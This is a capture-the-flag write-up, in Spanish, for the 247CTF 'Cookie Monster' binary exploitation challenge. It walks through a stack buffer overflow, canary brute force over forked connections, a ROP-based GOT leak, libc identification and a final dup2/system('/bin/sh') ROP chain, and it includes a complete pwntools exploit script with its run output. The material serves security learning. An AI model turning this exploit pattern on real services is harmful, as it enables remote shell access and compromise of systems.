# 247CTF - Cookie Monster Writeup

## Challenge Info
- **Name:** Cookie Monster
- **Category:** Binary Exploitation (Pwn)
- **Target:** `0b1e1d5f8b809485.247ctf.com:50428`
- **Description:** "We might not be able to write secure code, but at least we are starting to learn about secure compilation flags. Can you beat the cookie monster?"

## Flag
```
247CTF{8c1147c6XXXXXXXXXXXXXXXX98f39d8b}
```

---

## Analisis Inicial

### Informacion del Binario

```bash
$ file cookie_monster
cookie_monster: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, stripped
```

- **Arquitectura:** x86 (32-bit)
- **Tipo:** Ejecutable dinamicamente enlazado
- **Stripped:** Si (sin simbolos de debug)

### Protecciones

```bash
$ readelf -l cookie_monster | grep GNU_STACK
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

| Proteccion | Estado |
|------------|--------|
| NX (No Execute) | Habilitado |
| Stack Canary | Habilitado |
| PIE | Deshabilitado |
| RELRO | Parcial |

### Funciones PLT Disponibles

```
strcmp, bzero, __stack_chk_fail, htons, accept, exit, strlen,
__libc_start_main, write, bind, fork, listen, socket, recv, close, send
```

---

## Analisis del Binario

### Comportamiento del Servidor

El binario implementa un servidor TCP en el puerto 5555 que:
1. Acepta conexiones
2. Hace `fork()` para cada cliente
3. Solicita una contrasena
4. Compara con "admin123\n"
5. Responde "Welcome back admin!" o "Incorrect secret password:"

### Funcion Vulnerable (0x080486f6)

```asm
push   %ebp
mov    %esp,%ebp
push   %ebx
sub    $0x254,%esp              ; Stack frame de 596 bytes
mov    %gs:0x14,%eax            ; Obtiene el canary
mov    %eax,-0xc(%ebp)          ; Guarda canary en ebp-0xc
...
lea    -0x20c(%ebp),%eax        ; Buffer en ebp-0x20c
push   %eax
push   0x8(%ebp)                ; socket_fd
call   recv@plt                  ; recv(fd, buffer, 0x400, 0)
```

### Vulnerabilidad: Buffer Overflow

| Variable | Offset desde EBP | Tamano |
|----------|------------------|--------|
| Buffer | ebp - 0x20c (524) | ~512 bytes |
| Canary | ebp - 0xc (12) | 4 bytes |
| Saved EBX | ebp - 0x4 | 4 bytes |
| Saved EBP | ebp | 4 bytes |
| Return Addr | ebp + 0x4 | 4 bytes |

**El problema:** `recv()` lee hasta **0x400 (1024)** bytes en un buffer de **~512 bytes**.

```
Offset al canary: 0x20c - 0xc = 0x200 = 512 bytes
Offset al return: 512 + 4 (canary) + 4 (???) + 4 (ebx) + 4 (ebp) = 528 bytes
```

---

## Estrategia de Explotacion

### 1. Bypass del Stack Canary

El servidor usa `fork()`, lo que significa que **el canary es el mismo** para todas las conexiones hijas. Esto permite un ataque de **brute force byte a byte**.

**Metodo de deteccion:**
- Si el canary es **correcto**: la funcion retorna normalmente -> recibimos "Come back soon!"
- Si el canary es **incorrecto**: `__stack_chk_fail` se ejecuta -> conexion cerrada sin "Come back soon!"

```python
def try_byte(current_canary, byte_guess):
    r = remote(HOST, PORT)
    r.recv()  # Banner

    payload = b"A" * 512 + current_canary + bytes([byte_guess])
    r.send(payload)

    data = r.recv()
    return b"Come back" in data  # True si el byte es correcto
```

**Resultado:** Canary = `0xafcc5b00`

### 2. Leak de Libc

Con el canary conocido, construimos un ROP chain para leakear direcciones de la GOT:

```python
# ROP: send(socket_fd, got_entry, 4, 0)
rop = p32(send_plt)      # Llamar send
rop += p32(pop4_ret)     # Limpiar argumentos (pop ebx; pop esi; pop edi; pop ebp; ret)
rop += p32(4)            # socket_fd = 4
rop += p32(got_addr)     # Direccion GOT a leakear
rop += p32(4)            # Longitud
rop += p32(0)            # Flags
rop += p32(exit_plt)     # Salir limpiamente

payload = b"A" * 512     # Padding
payload += canary        # Canary conocido
payload += b"XXXX"       # 4 bytes desconocidos
payload += b"YYYY"       # saved_ebx
payload += b"ZZZZ"       # saved_ebp
payload += rop           # ROP chain
```

**Leaks obtenidos:**
```
__libc_start_main@libc: 0xf7de1d90
send@libc: 0xf7ec1920
write@libc: 0xf7eae6f0
```

### 3. Identificacion de Libc

Usando los ultimos 12 bits de las direcciones leakeadas:
- `__libc_start_main`: 0x**d90**
- `write`: 0x**6f0**

Consulta a [libc.rip](https://libc.rip):

```bash
$ curl -s "https://libc.rip/api/find" \
  -H "Content-Type: application/json" \
  -d '{"symbols": {"__libc_start_main": "d90", "write": "6f0"}}'
```

**Resultado:** `libc6-i386_2.27-3ubuntu1_amd64`

| Funcion | Offset |
|---------|--------|
| `__libc_start_main` | 0x18d90 |
| `system` | 0x3cd10 |
| `dup2` | 0xe6110 |
| `/bin/sh` | 0x17b8cf |

### 4. Calculo de Direcciones

```python
libc_base = libc_start_main_leak - 0x18d90  # 0xf7dc9000
system = libc_base + 0x3cd10                 # 0xf7e05d10
dup2 = libc_base + 0xe6110                   # 0xf7eaf110
binsh = libc_base + 0x17b8cf                 # 0xf7f448cf
```

### 5. ROP Final: Shell Interactiva

Para obtener una shell interactiva sobre el socket, necesitamos redirigir stdin/stdout:

```python
# ROP chain final
rop = b""

# dup2(socket_fd, 0) - Redirigir stdin
rop += p32(dup2)
rop += p32(pop3_ret)    # pop esi; pop edi; pop ebp; ret
rop += p32(4)           # socket_fd
rop += p32(0)           # stdin
rop += p32(0)           # dummy

# dup2(socket_fd, 1) - Redirigir stdout
rop += p32(dup2)
rop += p32(pop3_ret)
rop += p32(4)
rop += p32(1)           # stdout
rop += p32(0)

# system("/bin/sh")
rop += p32(system)
rop += p32(exit_plt)    # Return address para system
rop += p32(binsh)       # Argumento: "/bin/sh"
```

---

## Exploit Final

```python
#!/usr/bin/env python3
"""
Cookie Monster - 247CTF PWN Challenge
Stack canary brute force + ROP chain exploit
"""
from pwn import *
import time

HOST = "0b1e1d5f8b809485.247ctf.com"
PORT = 50428

CANARY_OFFSET = 512
KNOWN_CANARY = p32(0xafcc5b00)

# Binary addresses
send_plt = 0x080485c0
exit_plt = 0x08048520
libc_start_main_got = 0x0804a028
pop4_ret = 0x08048a68
pop3_ret = 0x08048a69

# libc6-i386_2.27-3ubuntu1_amd64 offsets
LIBC_START_MAIN_OFF = 0x18d90
SYSTEM_OFF = 0x3cd10
BINSH_OFF = 0x17b8cf
DUP2_OFF = 0xe6110

def leak_got(canary, socket_fd, got_addr):
    r = remote(HOST, PORT, timeout=10, level='error')
    r.recv(timeout=2)
    rop = p32(send_plt) + p32(pop4_ret) + p32(socket_fd) + p32(got_addr) + p32(4) + p32(0) + p32(exit_plt)
    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)
    time.sleep(1)
    data = r.recv(timeout=3)
    r.close()
    if b"Incorrect" in data:
        idx = data.find(b"Incorrect secret password:\n")
        leaks = data[idx + len(b"Incorrect secret password:\n"):]
        return u32(leaks[:4])
    return u32(data[:4])

def bruteforce_canary():
    """Brute force the stack canary byte by byte."""
    canary = b""
    for i in range(4):
        for byte in range(256):
            try:
                r = remote(HOST, PORT, timeout=5, level='error')
                r.recv(timeout=2)
                payload = b"A" * CANARY_OFFSET + canary + bytes([byte])
                r.send(payload)
                data = r.recv(timeout=2)
                r.close()
                if b"Come back" in data:
                    canary += bytes([byte])
                    print(f"[+] Canary byte {i}: 0x{byte:02x}")
                    break
            except:
                continue
        else:
            print(f"[-] Failed to find canary byte {i}")
            return None
    return canary

def exploit():
    context.arch = 'i386'
    canary = KNOWN_CANARY
    socket_fd = 4

    print(f"[+] Using known canary: {hex(u32(canary))}")

    # Leak libc
    print("[*] Leaking __libc_start_main...")
    libc_start_addr = leak_got(canary, socket_fd, libc_start_main_got)
    print(f"[+] __libc_start_main@libc: {hex(libc_start_addr)}")

    # Calculate addresses
    libc_base = libc_start_addr - LIBC_START_MAIN_OFF
    system = libc_base + SYSTEM_OFF
    binsh = libc_base + BINSH_OFF
    dup2 = libc_base + DUP2_OFF

    print(f"[+] libc_base = {hex(libc_base)}")
    print(f"[+] system = {hex(system)}")
    print(f"[+] dup2 = {hex(dup2)}")
    print(f"[+] /bin/sh = {hex(binsh)}")

    # Final exploit
    print("[*] === Sending final payload ===")
    r = remote(HOST, PORT)
    r.recv(timeout=2)

    rop = b""
    # dup2(socket_fd, 0) - redirect stdin
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(0) + p32(0)
    # dup2(socket_fd, 1) - redirect stdout
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(1) + p32(0)
    # system("/bin/sh")
    rop += p32(system) + p32(exit_plt) + p32(binsh)

    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)

    time.sleep(1)
    print("[*] Sending commands...")
    r.sendline(b"cat flag*")
    print(f"[+] Response: {r.recv()}")

if __name__ == "__main__":
    exploit()
```

---

## Ejecucion

```
$ python3 exploit.py
[+] Using known canary: 0xafcc5b00
[*] Leaking __libc_start_main...
[+] __libc_start_main@libc: 0xf7de1d90
[+] libc_base = 0xf7dc9000
[+] system = 0xf7e05d10
[+] dup2 = 0xf7eaf110
[+] /bin/sh = 0xf7f448cf
[*] === Sending final payload ===
[+] Opening connection to 0b1e1d5f8b809485.247ctf.com on port 50428: Done
[*] Sending commands...
[+] Response: b'247CTF{...}\nuid=1000(notroot)...'
```

---

## Aprendizaje del reto

1. **Stack Canary Brute Force** - Posible gracias a `fork()` que mantiene el mismo canary
2. **ROP Chain** - Para ejecutar funciones arbitrarias sin shellcode
3. **GOT Leak** - Para obtener direcciones de libc en runtime
4. **Libc Database** - Para identificar la version exacta de libc
5. **dup2() para shell interactiva** - Redirigir stdin/stdout al socket

## Herramientas Utilizadas

- pwntools
- ROPgadget
- libc.rip (libc database online)
- objdump / readelf

## Referencias

- [libc.rip](https://libc.rip) - Base de datos de libc online
- [libc-database](https://github.com/niklasb/libc-database) - Herramienta para identificar libc
